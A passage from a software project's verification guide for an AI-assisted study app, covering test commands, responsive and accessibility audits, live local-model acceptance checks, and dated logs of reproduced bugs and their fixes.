# Functional verification

Run `npm run check:release` for the deterministic release gate. It builds the
app and checks curriculum integrity, storage recovery, backup limits, request
contracts, model adapters, and browser workflows. Browser checks now start an
isolated app server automatically and continue after a failure so every suite
produces a result. Install Chrome or set `CHROME_PATH`. To check an already
running app, set `LUMEN_URL` instead.

A suite that fails is retried once and the retry is reported: the suite's
result carries `"attempts": [false, true]`, and the run ends with a "Passed
only on retry" line. Shared CI runners are sometimes starved (a 6 s suite taking
minutes, a background tab frozen), so one retry keeps runner stalls from
blocking unrelated work, while a real regression still fails twice. Treat a
repeated "passed only on retry" as a bug to fix. Set `LUMEN_BROWSER_RETRIES=0`
to disable retries when diagnosing.

The browser suites cover reading/editing, narration controls, annotations and
relocation, reviews and mistakes, imports, whiteboards and exports, backup and
restore, cross-tab sync, search, keyboard focus, mobile layouts, AI consent and
recovery, phone model lifecycle, diagrams, and stale application assets.
Synthetic speech/WebGPU fixtures check application behavior; they do not prove
audible output or GPU compatibility on a physical iPhone.

## Responsive regression checks

`npm run check:browser -- responsive` starts an isolated server and checks the
production build. Use `npm run audit:responsive` with `LUMEN_URL` to target a
running app. The same audit runs in the release gate and CI, which uploads its
JSON results and screenshots as `responsive-layout-results`.

The matrix covers 320, 360, 390, 430, 568, 768, 1024, 1225, 1280, and 1920px widths,
portrait and landscape, short viewports, and 200% text on phone and tablet.
Fresh browser profiles contain long document/collection names, unbroken links,
code, tables, notes, review cards, and AI history. The checks visit every main
route plus navigation, reader tools, teaching, whiteboard dialogs, annotations,
assessments, document dialogs, settings, and installation. They detect page
overflow, offscreen content, dialogs outside the viewport, an undersized
canvas, unreachable control centers, and uncaught browser errors. Wide code,
tables, and tool strips may scroll within a container that fits the viewport.

The `embedded-preview` and `theme-phone` cases also check the document canvas,
vertical scroll bounds, and navigation after scrolling a long page. They cover
Paper, Night, Contrast, and both light/dark System themes, collapse AI request
details, and resize a scrolled preview or rotate a phone. The preview matches
the editor screenshot's content dimensions in Chrome; production framing
protections stay enabled. These 80 checks catch theme gaps and stale scroll
positions that horizontal overflow checks miss. Native macOS rubber-band
animation still requires a manual check in the editor browser.

The cross-tab suite also keeps mobile navigation open while a second tab saves
a theme change. This reproduces the background-save race that previously
dismissed the menu when the document map was revalidated.
The responsive suite forces offline/online updates while a readiness control
has focus, then verifies Escape removes the dialog before testing other routes.

`LUMEN_LAYOUT_CASES=small-phone,phone-landscape` selects cases for diagnosis.
Use `LUMEN_LAYOUT_CASES=embedded-preview,theme-phone` for the scroll/theme cases.
`LUMEN_LAYOUT_ARTIFACTS` chooses the results directory; by default it is
`lumen-responsive-results` in the OS temporary directory.
`LUMEN_LAYOUT_SCREENSHOTS=1` captures every surface, including passing checks.
An unfiltered run is required for acceptance. Short-viewport emulation checks
layout resilience; it does not reproduce a physical keyboard, Safari safe-area
behavior, or a real touch device.

The expanded checks also caught notifications intercepting narration taps and
dialog scroll locks unnecessarily rebuilding AI diagrams. Notification text
now lets taps through, narration notifications sit above the transport, and
diagram theme observers ignore unrelated root-style changes. The audio audit
checks the resume button's hit target; the AI audit opens settings, verifies
that the diagram survives, and switches the real theme setting. Both AI
renderers also keep the same sanitized HTML prop when the answer is unchanged,
preventing React from replacing completed diagrams during unrelated updates.
Review and mistake dialogs likewise initialize only when opening a new draft;
background app updates retain their text and category. The review audit forces
an offline/online update while editing to reproduce this previously intermittent
failure. Layout measurements wait for finite entrance animations to settle.

## Real model acceptance

Passing mocks does not prove that an installed model returns usable content.
Start Ollama with the configured model and run the integrated loopback server:

```sh
ollama serve
# In another terminal, after building:
npm run start:local-ai
# In another terminal:
npm run check:live
```

`check:live` runs three serial checks against `http://127.0.0.1:4187`:

- `audit:ai-live`: all ten tasks through JSON and NDJSON, plus Fast and Deep
  prose/structured cases. Uses the real browser client validators and rejects
  empty, incomplete, uncited, or malformed results.
- `audit:ai-live-ui`: all eight visible study modes with real inference; checks
  interactive quiz answers, card reveal/save, answer-to-notebook save, locked
  engine controls, mobile/wide layouts, and persistence after reload.
- `audit:ai-live-smoke`: unopened-library retrieval, real streamed answer bytes,
  inline citations, Markdown, display math, and a visible source panel.

For web-enabled deployments, also run `npm run audit:ai-live-search`. It checks
the exact-query gateway and real model tool use for prose and flashcards.
Docker/SearXNG must be running; unavailable search is a failure, not a skipped
success. Synthetic questions used by this audit are sent to search engines.
Set `LUMEN_SEARCH_QUERY` to reproduce a particular exact-query failure. The
default `Ollama` query checks available public evidence; it does not establish
that every engine or domain-qualified query works. On 2026-09-14 the stricter
`site:docs.ollama.com thinking message content` probe returned no usable
evidence: several upstream engines were blocked and Bing's results did not
match the requested domain. The gateway retains the user's exact query and
rejects unrelated results. Upstream availability remains a deployment limit.

The live checks use fresh browser profiles and never access the user's normal
Chrome profile. They require real local compute and can take several minutes.
Use `LUMEN_AI_PROFILES=deep` or `LUMEN_AI_TASKS=socratic` to narrow endpoint
diagnosis. Do not replace the full acceptance run with a filtered result.

## Bugs reproduced on 2026-09-14

- Deep Qwen generation consumed its full token budget on private thinking,
  then repeated the same failure on retry: no answer after 211.8 seconds.
  A bounded 768-token first pass now falls back once to direct completion.
  The equivalent live request completed in 35.5 seconds. Neither unfinished
  prose nor private thinking is accepted as a completed answer.
- Socratic and Interview source checks rejected questions without citations.
  Every grounded request now names its exact allowed source labels and
  requires citations for questions as well as claims. Socratic also has an
  explicit question format; Interview respects a request for one question.
  The live endpoint prompts deliberately contain no extra citation coaching.
- Flashcard repair repeated uncited JSON when only system instructions
  changed. A single explicit correction turn now requests the supplied labels
  in supported answers; the exact failing live prompt recovered. Both
  transports check the repair and keep unvalidated drafts out of the UI.
- Starting Ollama after opening the tutor left a failed readiness check stale.
  The visible page now retries the check; a manual refresh is also available.
- Mac engine switching could cancel an active answer; engine controls now lock
  during both Mac and phone operations.
- An unrelated app render reset highlight form fields because an unstable
  close callback retriggered initialization. The regression changes network
  state during editing and checks that the chosen color and comment survive.
- Completed AI history used the normal typing debounce and could be lost on
  an immediate reload. AI history now schedules a save without that delay;
  live acceptance verifies the IndexedDB commit and the restored answer.
- Mobile controls could overlap the fixed bottom navigation after reducing
  instruction text. The AI page reserves space and scroll margins for it.

Readiness still depends on the configured Ollama and optional SearXNG services
running. Physical Safari/WebGPU, iOS backgrounding, LAN pairing, and audible
narration require the device checks in [DEVICE_TESTING.md](DEVICE_TESTING.md).

## Verified checkpoint: 2026-09-14

Local Chrome and the configured `qwen3.5:4b` passed:

| Check | Result |
| --- | --- |
| Release gate | Build, static/PWA, unit, scale, storage, backup, retrieval evaluation, and all 11 browser suites passed |
| Final AI/data suite | 341 passed |
| Real endpoint matrix | 24/24 across ten tasks, JSON/NDJSON, and Fast/Balanced/Deep |
| Configured HTTPS endpoint | JSON and NDJSON responses passed with the local CA trusted by the client |
| Real browser workflows | 8/8 modes; quiz interaction, card/note saving, reload persistence; no runtime errors |
| HTTPS library smoke | Unopened-lecture retrieval, streamed response bytes, source links, Markdown/math rendering, and mobile layout passed |
| Real web paths | Exact `Ollama` query, streamed explanation, and structured flashcards passed with five returned sources |

The domain-qualified search limitation above remains reproducible; a passing
general search does not imply that every upstream engine is healthy. These
results also do not replace physical iPhone/WebGPU and audio evidence.

## Responsive checkpoint: 2026-09-15

The initial implementation passed 342 AI/data tests, the curriculum, unit,
scale, storage, backup, retrieval, and production/PWA checks, and all 12
browser suites. The responsive suite passed 327 layout checks and 342 control
hit checks across all 11 configurations with no uncaught browser errors.
The visual audit was corrected to change the real theme setting and passed
on its focused rerun. CI runs the complete gate for the pull request.

The screenshot follow-up passed 407 layout/theme checks and 342 control hit
checks with no uncaught browser errors, including the new readiness focus
regression at all 11 screen/text configurations. Workflow and cross-tab suites
passed with the navigation fixes; visual, controls, and AI UI checks also passed
during this follow-up. Both the menu-dismissal and readiness-focus regressions
were first reproduced against the preceding builds.

## Bugs reproduced on 2026-09-24

Reader audit (issue #53) on 320–430 px phones, a 768 px tablet, and 1024–1920 px
desktops in Paper, Night, and Contrast:

- On a phone, Clip, Highlight, and Ask AI existed only in the tool row at the
  top of the lecture, about 7,400 px above a mid-lecture selection, and the row
  scrolled Whiteboard and Actions off-screen with no cue. A selection now shows
  a toolbar (Highlight, Clip, Ask AI, Listen) pinned above the bottom
  navigation, and the tool row wraps.
- The closed phone outline/notes/highlights sheet kept 26+ off-screen controls
  in the Tab order and accessibility tree. Closed, it is now inert and hidden;
  open, it is a modal sheet (focus moves in, Tab wraps, Escape closes, focus
  returns). The same modal contract now covers revision history.
- A tutor citation opened the right lesson, but restoring the saved reading
  position cancelled the scroll to the cited section. A pending navigation
  target now owns the first scroll and stays pinned while diagrams render.
- Night theme drew the browser's button face under narration targets and
  highlight cards; the selected target measured 1.13:1. Those controls now
  draw their own theme colors.
- Phone Mermaid labels shrank to 4.8 px, and every diagram was announced only
  as "Rendered Mermaid diagram". Wide diagrams now keep 72% of their natural
  size and scroll inside their frame with an edge cue. Each accessible name
  lists nodes and edges from the preserved source.
- The minutes-left chip sat under the sticky toolbar; it now sits beside the
  progress percentage. Line length changed nothing below 1440 px; it now sets
  the text measure and explains when the window caps it. Below 1240 px the
  outline starts hidden, and Table of contents shows or hides it.
- Teaching Mode's focus trap counted controls hidden on phones, so Tab stuck on
  Next section and Shift+Tab left the dialog. The trap now uses rendered
  controls; the section picker and timer are back on phones.
- Editor Reset discarded unsaved typing without asking. It now confirms in the
  app and keeps the unsaved draft as its own revision. History markers now
  match what Load into editor restores or removes.
- Narration's Read button was below the fold; on a 320 px phone it sat 246 px
  below the sheet. It now follows the target picker, the sheet takes focus, and
  the mini player gives the sentence its own row.
- Wide code and tables could not be focused for keyboard scrolling, and cells
  split words at 135% text. They are now focusable named groups with edge cues,
  and cells keep whole words. Lecture text follows the browser text size, and a
  text-size change keeps the current passage in place.
- TeX in edited copies and uploads stayed raw. The reader now lazily loads the
  sanitized KaTeX path only for sources with TeX outside code.

Review of those fixes reproduced three follow-up bugs, now fixed:

- Export HTML printed every formula twice (the MathML and the unstyled KaTeX
  HTML). The export now shows the MathML copy only.
- A personal-note citation opened its lecture at the top instead of the saved
  reading place (0.00 against a saved 0.50), because the citation skipped the
  position restore without scrolling anywhere itself.
- During the re-anchoring hold after a text-size change or citation, late
  layout pulled Back to top, Find, outline, and narration jumps back to the old
  passage (scrollTop 9,097 after Back to top). Those jumps now end the hold.

Each fix has a regression check in the workflow, annotation, audio, control,
responsive, AI UI, or unit suites. The citation check fails on the previous
build: the cited heading was focused but 4,507 px below the viewport.

## Whiteboard bugs reproduced on 2026-09-24

Touch-emulated Chrome at 320–852px wide and desktop at 1280px reproduced
these defects before the fix (issue #55):

- On touch, Text and Sticky note opened their dialog and closed it at once:
  the tap's compatibility click landed on the new scrim. Placement now runs
  on the click that ends the tap; the workflow audit taps at 20% height.
- Points were fractions of whatever canvas showed them, so a square drawn on
  a phone became a 2.4:1 rectangle on a Mac. Pages now keep their authoring
  size and are letterboxed with one uniform scale. Legacy boards adopt the
  canvas they are first shown on without rewriting any point.
- Edge moves, nudges, and duplicates clamped each point and squashed shapes,
  rotated ones included, whose stored points clamped even when the turned
  shape still fit. The whole selection now moves by one delta, limited by
  both its rotated footprint and its stored points.
- The phone toolbar was a 1,228–1,480px strip with Undo, Redo, and Zoom off
  screen; landscape showed 13–73px of canvas above the bottom navigation.
  The responsive audit now measures the visible canvas, not the element box.
- Board chrome kept light colours in Night (1.85:1 actions); tools, colours,
  and backgrounds had no pressed state; objects could not be selected by
  keyboard; Delete acted from the page select and behind open dialogs.
- The eraser cut holes in the grid, wrapped text could only be selected by
  its first line, sticky notes hid overflow silently, placed text could not
  be edited, and SVG export scaled text and strokes differently from PNG.

## Bugs reproduced on 2026-09-24: tutor answer quality (#58)

The audit's real `qwen3.5:4b` runs found these problems in the server's task
instructions and recovery paths. The "after" runs used this branch's server,
the same model, and the local SearXNG. They were streamed through the real
browser client (13 generations plus one tutor UI run).

- Socratic copied the literal `Output pattern: Your question? [S1]` example.
  In 4 of 4 audit replies the answer began with "Your question?", and none
  assessed the learner's correct answer. The instruction now describes the
  format instead of giving a template. After a tutor question, it asks for a
  one- or two-sentence assessment and then one cited question. After: the
  follow-up opened with "Your understanding is correct: …" and asked exactly
  one question ending in `[S1]` (Fast, 72 tokens, 14.0 s). Both Balanced
  endpoint Socratic cases passed the new no-prefix assertion.
- Fast only lowered the token ceiling. For the same no-library L2 prompt,
  Fast gave 3,318 and 3,611 characters (810 and 849 tokens, 28–33 s), and
  Deep gave 3,569 and 3,506. Fast prose now has a target of about 150 words.
  After: Fast gave 1,589 characters, 231 words, 390 tokens in 14.1 s.
  Balanced gave 6,998 characters, 1,082 words, 1,642 tokens in 59.0 s.
- A web fallback whose search returned nothing usable ended with
  `WEB_SEARCH_NO_RESULTS` after 23.5 s, which discarded 8 attached library
  passages. A Markdown request with library evidence now gets a library-only
  answer that must cite `[S#]` and cannot contain `[W#]`. The answer opens
  with a "Current-web evidence unavailable" notice and reports
  `webSearch.used: false`. Without library evidence, and for structured
  tasks, the request still fails closed. After: 4 of 4 nonsense-release
  queries completed in 25.8–35.8 s with the notice and `[S#]` citations.
  The model sometimes still describes the search or overstates absence
  ("no public evidence exists"). The tutor badge still reads "not needed"
  until the client maps `requested && !used && rounds > 0` to a failed
  fallback.
- Code review called population variance a defect and said scikit-learn
  defaults to N−1. A later run recommended the unstable one-pass
  E[x²]−E[x]² variance. Findings are now labeled Defect (traced to a failing
  input) or Convention/alternative. Uncertain library defaults and that
  shortcut are named explicitly. After: the off-by-one was traced
  (`[10, 20, 30]` returns 16.67), and N versus N−1 was labeled "not a
  defect". The model still made a hedged, partly wrong NumPy-default remark,
  so treat code review as advisory.
- Grounded prose sometimes needed a citation regeneration: 2 of 4 audit
  runs, 0 of 4 on re-check. Grounded prose now ends each source-backed
  paragraph with its label. Grouped or spaced labels the model wrote
  (`[S1, S2]`, `[S 1]`) are normalized. The server never adds a label to
  uncited text. After: 0 of 8 streamed grounded runs needed a regeneration.
- One grounded Explain answer arrived as a raw JSON object and passed
  because it contained `[S1]`. Prose tasks now reject bare JSON. They
  regenerate once as Markdown, then fail with `AI_CONTRACT_ERROR`.
  Source-free live prose holds back an opening `{` (an opening `[` usually
  starts a Markdown link, so it still streams). This could not be
  reproduced on demand (0 of 14 after-runs), so `server/ai/quality.test.mjs`
  covers it deterministically.

The filtered endpoint matrix (`LUMEN_AI_TASKS=socratic,explain`,
`LUMEN_AI_PROFILES=balanced,fast`) passed 5/5. It also recorded
per-case output length and streamed regeneration counts. This filtered run
does not replace the full acceptance run.

Review follow-up on the same day:

- The JSON guard first held any source-free answer that opened with `{` or
  `[`. A Markdown link opener therefore stopped streaming, and a length stop
  lost the partial the learner would otherwise keep. Only `{` is held now.
- A library-only draft that began with four spaces became an indented code
  block under the notice (checked with the tutor's `marked` renderer), so its
  first paragraph and `[S#]` rendered as code. The draft is trimmed first.
- Live: a Socratic follow-up whose history still carried the old
  `Your question?` template assessed the answer, asked one `[S1]` question
  with no prefix, and streamed text equal to `outputText` (13.3 s). A
  grounded follow-up after a library-only answer did not repeat the notice
  (7.9 s).

## Bugs reproduced on 2026-09-24: Library and Home

Browser audits at 320–1280px against `main` at 36026b2 (issue #52):

- Typing a query stored every prefix (`d`, `dr`, `dro`…) as a recent search.
  Recents now record committed searches only: Enter, leaving the field,
  opening a result, or a 1.5-second pause. Stored prefixes are pruned on load,
  and each chip can be removed.
- `-regression` returned all 143 lectures; an exclusion alone now excludes
  (91 remain). `part:5` also matched Part 15 and `part:1` matched 12 Parts;
  numeric Part filters now compare the number exactly. The typographic minus
  shown in the old placeholder is folded to a hyphen.
- `RAG` matched "storage" and "average" (100 capped results). Terms of four
  letters or fewer must start a word and all-caps acronyms must be whole
  words: `RAG` now returns 14 results, while `tran` still finds "transformer".
- `regresion` listed Part 1 in curriculum order with no highlight. Corrected
  words now score by field, the Regression chapters rank first, and the page
  says "Showing matches for “regression”".
- Built-in lectures never showed match context because the search index was
  lowercased and the worker kept no body text. The index keeps case, and
  snippets are cut only for returned results; the scale budget still holds.
- The phone study-method card collapsed to a 17px column (2,272px tall), and
  mastery rows split "readines/s". The responsive audit now fails when a
  Home or Library word splits across lines at normal text size; it flags the
  previous build.
- The search bar wrapped Clear onto a second row; Continue targets disagreed
  across Home; lectures opened by link or Back never reached Recent; the
  fresh "Start reading" tile was disabled; Today's plan ignored the session
  length; and the curriculum map could not be reached by keyboard.

New regression checks: the workflow audit waits for a link-opened lecture to
reach Recent, and the control audit requires an enabled fresh-profile reading
tile and a curriculum map with one Tab stop that ArrowRight advances. Both
fail against the 36026b2 build.

A review pass on the fix branch reproduced three more bugs before merge:

- The first link-opened-Recent fix re-ran whenever a tab adopted another
  tab's profile. Two idle tabs reading different lectures then rewrote Recent
  at each other (1,337 profile revisions in 3 seconds in the cross-tab
  audit). Recent is now recorded once per entry into a lecture, and the
  cross-tab audit holds two idle reader tabs still.
- Pressing Clear blurred the search field first, so a half-typed query
  (`attenti`) was still saved as a recent search. Clear now keeps focus in
  the field, and the workflow audit checks that an abandoned query is not
  recorded.
- Uploaded notes lost match snippets for accent-folded terms (`naive` in a
  note that says "naïve"). The unit audit covers this case.

## Accessibility checks

`npm run check:browser -- a11y` runs axe-core 4.13 (WCAG 2.2 A/AA plus best
practice) on every route, Settings, and the open mobile drawer in Paper, Night,
and Contrast at 393px and 1280px. axe is a pinned dev dependency, evaluated
through CDP because the app CSP blocks injected scripts. Any violation fails
the gate except a short, commented allowlist in `scripts/a11y_audit.mjs`. Each
entry is one rule inside one component container and names the wave that owns
it; delete the entry when that component is fixed. The audit also asserts one
`main` landmark, a working skip link, a unique title per route, `aria-current`
on the active navigation item, and heading focus after navigation. It also
checks that the closed drawer stays inert after Settings and a reader dialog
close, that toasts reach persistent live regions and dismiss while the app
re-renders, the offline status, the Ctrl+K dialog guard, and forced colors.

`src/lib/themeContrast.test.mjs` runs in `npm run check`. It parses the theme
token blocks in `src/styles.css`. It requires 4.5:1 for every text token on
every paper surface and 3:1 for the focus ring in Paper, Night, System-dark,
and Contrast. It also fails on any `var(--token)` that no stylesheet defines.

## Accessibility foundation reproduced on 2026-09-24

- Muted text, small coral text, and white-on-coral primary buttons were
  2.4–3.3:1 in Paper and Night. The theme tokens now pass 4.5:1: separate
  `--coral-text`/`--teal-text` tokens for small text and `--primary-bg`/
  `--on-primary` for buttons. `--blue-soft`, `--danger`, `--accent`, and
  `--ai-warn` were undefined or fixed to light-theme values; each theme now
  defines them.
- The 65%-alpha coral focus ring measured 1.4–2.1:1 in Paper and on the
  Contrast sidebar. The tutor's rings used 26% alpha, and the library search
  suppressed its ring. Focus now uses an opaque ring between two halo bands,
  with a gold ring on navy surfaces. The library search pill shows the ring.
- The UA ButtonFace grey showed through buttons in dark themes. Buttons now
  reset to a transparent background.
- In Contrast, the hero and review hero showed dark red or #222 text on navy,
  and the sidebar ignored the theme. These surfaces are now flat black with
  white text, and the sidebar colors come from tokens.
- `overflow-wrap: anywhere` on every page reduced flex labels to one letter per
  line. Pages now use `break-word`. Only learner-authored cards break anywhere,
  and control rows wrap under their headings. The responsive suite confirms that
  no page overflow returned.
- Most routes had no `main` landmark, component `main` elements were nested,
  page headers became extra banners, and there was no skip link. The route view
  is now the single `#main-content` landmark, with a skip link that does not
  change the hash.
- The document title never changed, the navigation had no `aria-current`, and
  navigation was silent. Titles now follow the route, and in-app navigation
  focuses the new page heading.
- Toast live regions mounted already filled, errors used the success icon, and
  a new `onClose` on every render restarted the dismiss timer (HL-22). Messages
  now go to persistent polite/assertive regions. Icons follow the toast kind.
  Timers are keyed to the toast and pause while its dismiss button is hovered
  or focused. Errors stay 10 seconds. Toasts move above open sheets and the
  update banner.
- Closing any App dialog removed `inert` from the closed mobile drawer. So did
  a component dialog such as reader actions. Background inertness is now
  rendered from one modal flag, and the shell restores the drawer's hidden
  state whenever a component dialog clears it.
- The bottom navigation painted over the open drawer and took its taps. The
  Settings close button scrolled away on phones. The drawer now layers above the
  navigation as a modal dialog, and Settings has a sticky header with section
  headings, a theme radio group, and meter semantics. The responsive suite
  checks the drawer's paint order with background hit testing enabled and the
  close button after scrolling.
- Review of the foundation branch found two regressions it had introduced. A
  permanent `tabindex="-1"` on `<main>` meant any click on lecture text parked
  focus there. PageDown and the arrow keys then stopped scrolling the reader,
  and teaching mode's Space shortcut stopped working. The landmark is now
  focusable only while the skip link or a lazy route holds focus there. The
  curriculum list's new bottom fade also dimmed the keyboard-focused Part; the
  fade now lifts while a Part has keyboard focus. `audit:a11y` clicks lecture
  text and asserts that focus stays on the body and PageDown scrolls. It also
  tabs through the Parts and asserts that no focused row sits under the fade.

## Bugs reproduced on 2026-09-24: AI tutor defects (#56)

A strict AI tutor audit (issue #56) reproduced these against mocked and real
`qwen3.5:4b` requests. Each fix has a regression in the named audit.

- One tab saved a cloned user turn (`sync-conflict-*`) and warned about a
  "concurrent tab change" after Library-first requests: a second quick save
  read its merge base before the first had committed. Saves now read base and
  local state when their turn runs. `audit:ai-ui` sends three turns with slowed
  IndexedDB commits and expects one user and one answer per turn, no conflict
  record and no warning; `audit:sync` still merges real concurrent tabs.
- Library first answered "Explain the key ideas in this lesson" from other
  chapters. Requests about the open lesson now reserve its passages.
  `audit:ai-ui` expects the open lesson to lead the evidence; unit tests pin
  the reservation and the deictic-wording check.
- Choose sources listed only lessons opened this session. It lists the whole
  catalog and loads a lesson when ticked; an empty filter says so.
- Copy stripped every `_`, `*` and `~`; quiz, card and plan answers copied and
  exported as raw JSON with unresolved `[S#]` labels. Copy and export now use
  the Markdown source, readable structured results and a source list.
- A sent Ask AI excerpt came back over the learner's draft on every tutor
  remount and landed unfocused far above the composer. Inserts are consumed
  once, name the lecture, keep an unsent draft and focus the composer.
- Leaving mid-answer left an unanswered question; the engine choice reset on
  every visit; a second flashcard add reported failure although the cards were
  saved; Refresh silently unticked the web-fallback permission. All four are
  covered by the lifecycle scenario in `audit:ai-ui`.
- Quiz, card and plan fields showed raw `$TeX$`, and a quiz citation rendered
  one character per line. Structured fields render KaTeX inline.
- A hidden copy-status element extended the page by thousands of pixels;
  `audit:responsive` now seeds a completed turn before checking the composer
  at the page bottom.
- Focus fell to `<body>` after Generate, completion, Stop, Check answer, Save
  and Clear; the elapsed counter was re-announced every second while
  completion was silent; the grounding radiogroup ignored arrow keys; Clear
  used `window.confirm`; a learner's own Stop showed as a red error. The
  keyboard scenario in `audit:ai-ui` covers each.
- Streaming scrolled the whole page back down after the learner scrolled away,
  and completion showed the end of a grounded answer. Following now scrolls
  only the conversation, and completion reveals the answer's start.

The adversarial review of the same branch reproduced six more, each first
confirmed against the preceding build:

- A learner who scrolled back up inside a streaming answer was snapped back to
  its end: following ignored every scroll within 150 ms of its own, and deltas
  arrive every frame. `audit:ai-ui` streams a long answer, scrolls the
  conversation to its start and expects it to stay there.
- On On-device Lite, Ask AI focused the question box before the device panel
  above it finished loading, which pushed the box out of view; on phones the
  old check also ignored the fixed top and bottom bars. `audit:ai-ui` checks
  both engines against those bars, again a second later.
- "The current state of the art" and "the open problems in RL" counted as
  requests about the open lesson and reserved its passages. Unit tests pin
  them as general questions.
- A keyboard Stop landing as retrieval finished could announce the stale
  "Library evidence ready…" after "Generation stopped." (1 of 100 probed
  stops, and an intermittent `audit:ai-ui` failure). The audit re-reads the
  status region 400 ms after the stop.
- An approved web search that kept no usable evidence showed "Web fallback not
  needed" beside the server's "Current-web evidence unavailable" notice.
  `audit:ai-ui` mocks that response and expects the failed-fallback badge.
- The Depth select and the source filter were 42px tall on phones.
  `audit:ai-ui` now checks every Mac tutor control on a 393px phone.

## AI tutor depth checked on 2026-09-24 (#57)

Issue #57 made the Mac tutor phone-first and added study features on top of
the #56 fixes. The request contract, the server and the persisted profile
shape are unchanged: every feature is a visible question sent through the
one shared fit path (`src/lib/tutorRequest.js`), or local UI state. Each item
below has regressions in the named audit.

Layout and input:

- The composer docks above the bottom navigation. `audit:ai-ui` checks five
  viewports (393×852, 320×640, 375×667, 820×1180, 1280×800) on first load,
  with an eight-line draft, while streaming, after an answer, at the page
  top, with an over-long prompt and with a Socratic session strip: the
  question box and Send stay between the top bar and the navigation, the
  page never scrolls sideways, and below 981px the page is the only
  vertical scroller.
- Depth, answer length, web fallback and privacy moved to an Options sheet
  (focus trap, Escape, focus return, 44px targets). The consent card stays in
  the dock until acknowledged; an armed web permission stays visible there.
- The engine picker is one line; phones pick the mode from a native select.
- Enter sends only with a fine pointer; Shift+Enter, IME composition and Code
  review keep new lines; Up arrow recalls the last question; Esc stops an
  answer but never from a sheet, dialog or open disclosure.
- Scrolling back while an answer streams stops following (iOS rubber-banding
  ignored); Jump to latest and Answer ready bring the learner back and move
  focus to the answer.
- Grounded answers show steps (finding passages, drafting, checking
  citations) with the lessons found; each step is announced once.
- Deliberate deviation: an empty box and the unacknowledged disclosure do not
  draw their disabled reason in the dock (it covered the tutor header on 320px
  phones); it stays linked from Send and in the status region.

Study features:

- Suggested starts come from the open and next lessons, open mistakes and
  lapsed cards; a fresh profile never names the roadmap. A start fills the box
  and never sends; a real draft is replaced only on request.
- Follow-ups under the newest answer remember only that question and answer,
  keep its grounding, retrieve with its topic (the learner's question behind
  any chain of follow-ups) and never use the web.
- Quizzes take an optional confidence, show the score once every question is
  checked (announced once, confident misses first), explain a miss through a
  Fast answer check with no score or strengths shown, save misses to the
  mistake notebook once and build a new quiz on the weak spots.
- Listen reads finished answers through the app's speech engine and stops on a
  new question, New topic or leaving the tutor.
- New topic replaces the header's Clear and can export first. Turns before a
  break of more than three hours are neither sent nor summarised; a divider and
  the privacy panel say so.

Practice features:

- A Socratic or Interview session (derived from the conversation, never
  stored) shows a strip in the dock: the question count, Hint, I'm stuck and
  Wrap up; while a question waits, the box becomes the answer box. Hints and
  reveals are hidden modes, so they stay in the session without counting as
  questions; they retrieve with the tutor's last question and its lesson and
  never use the web. Wrap up sends only the session's turns (up to 12
  messages, 60% of the input budget, no summary, no library text) and names
  the covered turns when the session is longer. `audit:ai-ui` checks each
  payload, the counter, the reveal note, the Wrap up suggestion at ten
  messages, the strip hiding in another mode, 44px actions on one phone row,
  and Save to notes and Make flashcards on the recap. Nothing is graded.
- Interview practice draws authored questions (missed first) and grades a
  typed answer with a hidden `answer_feedback` mode whose only source is the
  question's model answer and rubric. `audit:ai-ui` checks that the model
  answer is not in the page before grading, that an answer crowding out the
  rubric is blocked with a reason, the payload (no library, web or history,
  one whole reference), the rubric checklist without the model's score, the
  reference behind a button, ticks surviving a reload, and a miss merging with
  a timed round's miss of the same question. The practice views and track
  helpers load with the bank, off the precached tutor route: the first build
  put a shared `interviewTracks` chunk in the offline route list and route
  screens at 912,997 bytes, which `audit:app` rejected; they are now
  897,679 bytes (budget 900,000).
- Work through with tutor (mistake notebook) and Review my misses with tutor
  (readiness check) put a prepared question in the box: consumed once, never
  sent, a draft kept unless replaced, focus in the box, hidden with AI features
  off, and short enough for On-device Lite's 1,800-character box.
  `audit:phone-ai-ui` applies one on On-device Lite.
- A Library-first request names its first attached lesson as its topic
  ("Chapter 1 — Linear Regression and Regularization (+7 related passages)")
  instead of "8 selected Lumen sources".
- Deliberate deviations: phones label the session actions Hint and I'm stuck
  so they share one row; after a reveal the strip offers Next question instead
  of a hint; a tutor question gets the strip instead of answer follow-ups;
  interview answers are typed in the practice card, not the dock; an unsent
  question from an earlier bridge counts as a draft.

Live `qwen3.5:4b` runs on a 393px phone (about 8 generations per stage):

- Stage 1: a grounded answer found 7 passages and landed after 35 s with the
  composer in view. The "Checking citations" step never lit up live: the
  server sent no validating phase before completion (a #58 question).
- Stage 2: Simpler finished in 19 s with 12 resolved citations and a history
  of exactly the followed pair; a Fast answer check took 17 s, schema-valid,
  with 4 resolved citations.
- Stage 3, Socratic: start 12 s, an answer turn 10 s and Hint 12 s, each one
  question with resolved citations; the hint did not state the answer. The
  server prompt still opened the first reply with "Your previous answer
  correctly identified…" and called the hint request "your hint" (#58). The
  first live Wrap up failed its grounding check: the session's turns kept
  their `[S#]` labels and the model copied one into a recap sent without
  evidence. Session memory now drops those labels (unit and `audit:ai-ui`
  regressions); the rerun took 21 s and offered Save to notes and Make
  flashcards. It credited the learner with a point the tutor had revealed, so
  the Wrap up question now asks for credit on the learner's own answers.
- Stage 3, interview practice: a partial answer to `mle-01` graded in 17 s,
  schema-valid, 2 resolved citations; its gaps named exactly the three rubric
  points the answer missed (hand grade: 1 of 4; hidden model score 35). A
  vague answer to `mle-02` graded in 20 s with no credit and all four rubric
  points as gaps (hidden score 10). Neither was generous.
- Stage 3, Work through with tutor: the sent mistake answered in 13 s with 3
  resolved citations, but it retrieved the question bank and case studies,
  because the instructions ("work through this mistake") outweighed the
  topic. A prepared question now searches with the mistake's question and
  expected answer while it is sent as placed; `audit:ai-ui` expects the
  regularization chapter for it. The model also explained the answer instead
  of first asking what went wrong, the Socratic prompt issue above.

The branch was rebased onto the #69 citation-forgery fix. The answer-check
and rubric results render model text through the same inline renderer, so
model-authored HTML shows there as text and only the renderer's own `[S#]`
controls are buttons. On the docked phone layout the forged route label in
that fix's audit wraps, and the middle of its two-line box sat on the genuine
`[S#]` beside it; the audit now clicks the label's first line.

Review follow-up. An adversarial pass over the branch confirmed each defect
against the preceding build (or live) before fixing it, with a regression in
the named audit or unit test:

- A follow-up of a follow-up searched with the chip's own wording. Live,
  Check my understanding after Give an example on a ridge answer retrieved
  "Chapter 2 — Problem Framing" and quizzed on customer churn; in
  `audit:ai-ui` the chained quiz retrieved chapters 6, 2 and 7. Follow-ups
  now search with the learner's question behind the chain, on both engines.
  Live rerun: Chapter 1 (+6 related passages), a ridge question in 13 s.
- Wrap up with no answer of the learner's credited them with the hint's
  points; the recap question now says there is nothing to credit (live
